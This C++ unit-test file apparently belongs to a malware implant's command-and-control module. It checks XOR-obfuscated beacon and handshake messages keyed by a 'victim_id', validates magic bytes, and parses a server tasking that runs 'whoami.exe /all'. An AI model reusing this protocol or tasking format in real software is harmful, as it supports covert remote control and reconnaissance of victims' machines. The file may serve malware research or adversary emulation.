#include "comms.hpp"
#include <gtest/gtest.h>
#include <vector>

// Fills buffer with 0x2
NTSTATUS mock_BCryptGenRandom(
    BCRYPT_ALG_HANDLE hAlgorithm,
    PUCHAR            pbBuffer,
    ULONG             cbBuffer,
    ULONG             dwFlags
) {
    for (ULONG i = 0; i < cbBuffer; i++) {
        pbBuffer[i] = 0x2;
    }
    return STATUS_SUCCESS;
}

class CommsTest : public ::testing::Test {
protected:
    std::vector<unsigned char> dummy_msg_buf;
    std::vector<unsigned char> blank_msg_buf;
    std::vector<unsigned char> dummy_rsp_buf;
    client_message* p_dummy_msg;
    client_message* p_test_msg;
    server_response* p_dummy_rsp;
    unsigned char magic[3] = {0x18, 0x04, 0x04};
    unsigned char dummy_id[16] = {
        0x70,0x77,0xa4,0x89,0xac,0x4e,0xcc,0x0f,
        0x30,0x4e,0x80,0xe9,0x66,0x97,0xed,0x9f
    };
    unsigned char dummy_data[20] = {
        0xe1,0x1b,0x89,0xbc,0x8c,0x8f,0xc9,0xa9,
        0xf8,0x10,0xfd,0x85,0x27,0xcf,0xfd,0x7b,
        0xd7,0xb2,0x8e,0x68
    };

    unsigned char test_task_resp_bytes[33] = {
        0x18,0x04,0x04,0x1c,0x00,0x05,0x01,0x00,
        0x00,0x00,0x3c,0x00,0x00,0x00,0x0f,0x00,
        0x00,0x00,0x77,0x68,0x6f,0x61,0x6d,0x69,
        0x2e,0x65,0x78,0x65,0x20,0x2f,0x61,0x6c,
        0x6c
    };

    virtual void SetUp() {
        dummy_msg_buf.reserve(sizeof(client_message));
        std::memset(dummy_msg_buf.data(), 0, dummy_msg_buf.capacity());
        p_dummy_msg = reinterpret_cast<client_message*>(dummy_msg_buf.data());
        std::memcpy(p_dummy_msg->magic, magic, sizeof(magic));
        std::memcpy(p_dummy_msg->victim_id, dummy_id, sizeof(dummy_id));
        p_dummy_msg->msg_type = MSG_TYPE_HANDSHAKE;

        blank_msg_buf.reserve(sizeof(client_message));
        std::memset(blank_msg_buf.data(), 0, blank_msg_buf.capacity());
        p_test_msg = reinterpret_cast<client_message*>(blank_msg_buf.data());

        dummy_rsp_buf.reserve(sizeof(server_response));
        std::memset(dummy_rsp_buf.data(), 0, dummy_rsp_buf.capacity());
        p_dummy_rsp = reinterpret_cast<server_response*>(dummy_rsp_buf.data());
        std::memcpy(p_dummy_rsp->magic, magic, sizeof(magic));
    }
};

TEST_F(CommsTest, TestDataStructs) {
    EXPECT_EQ(sizeof(client_message), 278 + MSG_DATA_MAX_LEN);
    EXPECT_EQ(sizeof(server_response), 6 + MSG_DATA_MAX_LEN);
    EXPECT_EQ(sizeof(handshake_data), 4 + MAX_COMPUTERNAME_LENGTH + 1);

    server_response* tmp_rsp = reinterpret_cast<server_response*>(test_task_resp_bytes);
    EXPECT_EQ(PAYLOAD_SIZE(tmp_rsp), 0x1c);
    EXPECT_EQ(tmp_rsp->resp_type, RESP_TYPE_EXEC_CMD);
    task_command_data* tmp_task_data = reinterpret_cast<task_command_data*>(tmp_rsp->data);
    EXPECT_EQ(tmp_task_data->task_num, 1);
    EXPECT_EQ(tmp_task_data->timeout, 60);
    LPCSTR want_cmd = "whoami.exe /all";
    ASSERT_EQ(tmp_task_data->command_len, strlen(want_cmd));
    EXPECT_EQ(memcmp(tmp_task_data->command, want_cmd, strlen(want_cmd)), 0);
}

TEST_F(CommsTest, TestGetClientMsgSize) {
    SET_PAYLOAD_SIZE(p_dummy_msg, 20);
    EXPECT_EQ(GetClientMsgSize(p_dummy_msg), 281);

    SET_PAYLOAD_SIZE(p_dummy_msg, 17);
    EXPECT_EQ(GetClientMsgSize(p_dummy_msg), 278);

    SET_PAYLOAD_SIZE(p_dummy_msg, 100);
    EXPECT_EQ(GetClientMsgSize(p_dummy_msg), 361);
}

TEST_F(CommsTest, TestSetClientMsg) {
    ASSERT_EQ(SetClientMsg(p_test_msg, dummy_id, MSG_TYPE_BEACON, dummy_data, sizeof(dummy_data), mock_BCryptGenRandom), ERROR_SUCCESS);
    ASSERT_EQ(GetClientMsgSize(p_test_msg), 298);

    unsigned char want[298] = {
        0x18, 0x04, 0x04, // magic
        0x25, 0x00, // payload_size

        // xor_key
        0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,
        0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,
        0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,
        0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,
        0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,
        0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,
        0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,
        0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,
        0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,
        0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,
        0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,
        0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,
        0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,
        0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,
        0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,
        0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,

        0x72,0x75,0xa6,0x8b,0xae,0x4c,0xce,0x0d,
        0x32,0x4c,0x82,0xeb,0x64,0x95,0xef,0x9d, // encrypted victim_id
        0x00, // encrypted msg_type 0x2
        0xe3,0x19,0x8b,0xbe,0x8e,0x8d,0xcb,0xab,
        0xfa,0x12,0xff,0x87,0x25,0xcd,0xff,0x79,
        0xd5,0xb0,0x8c,0x6a // encrypted data
    };
    EXPECT_EQ(memcmp(p_test_msg, want, sizeof(want)), 0);

    char test_data[] = "HELLO WORLD";
    ASSERT_EQ(SetClientMsg(p_test_msg, dummy_id, MSG_TYPE_BEACON, test_data, strlen(test_data), mock_BCryptGenRandom), ERROR_SUCCESS);
    ASSERT_EQ(GetClientMsgSize(p_test_msg), 289);

    unsigned char want2[289] = {
        0x18, 0x04, 0x04, // magic
        0x1C, 0x00, // payload_size

        // xor_key
        0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,
        0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,
        0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,
        0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,
        0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,
        0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,
        0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,
        0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,
        0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,
        0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,
        0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,
        0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,
        0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,
        0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,
        0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,
        0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,0x02,

        0x72,0x75,0xa6,0x8b,0xae,0x4c,0xce,0x0d,
        0x32,0x4c,0x82,0xeb,0x64,0x95,0xef,0x9d, // victim_id
        0x00, // encrypted msg_type 0x2
        0x4a,0x47,0x4e,0x4e,0x4d,0x22,0x55,0x4d,
        0x50,0x4e,0x46 // data
    };
    EXPECT_EQ(memcmp(p_test_msg, want2, sizeof(want2)), 0);
}

TEST_F(CommsTest, TestValidateMagic) {
    EXPECT_TRUE(ValidateMagic(p_dummy_rsp));
    p_dummy_rsp->magic[1] = 0x16;

    EXPECT_FALSE(ValidateMagic(p_dummy_rsp));
}
